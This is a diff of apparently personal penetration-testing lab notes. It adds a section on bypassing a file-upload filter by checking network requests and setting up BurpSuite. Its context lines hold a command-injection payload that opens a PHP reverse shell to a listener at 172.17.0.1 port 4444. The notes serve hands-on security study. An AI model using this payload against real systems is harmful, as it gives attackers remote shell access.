@@ -2367,3 +2367,23 @@ Now we want a shell:
 - grab a php payload from -->  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
 - `';php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#`
   _<span style="color:#00b050">WE HAVE A SHELL </span> 
+
+
+### File upload
+#### Basic Bypass 0x01
+let's understand how this file upload works:
+first we can try to upload a txt file:
+- `echo "test" > test.txt`
+- it doesn't work --> prompt the user that are acceptable only png and jpg
+
+check the calls to the webserver:
+- open the dev tool -->  CTRL+ALT+C
+- go to Network
+- Reload the page
+- Upload again the txt file
+- check if the app is doing some checks (here no)
+
+###### BurpSuite
+download an image
+Setup initial things for BurpSuite -->  [[cheet#Initial things to do]]
+
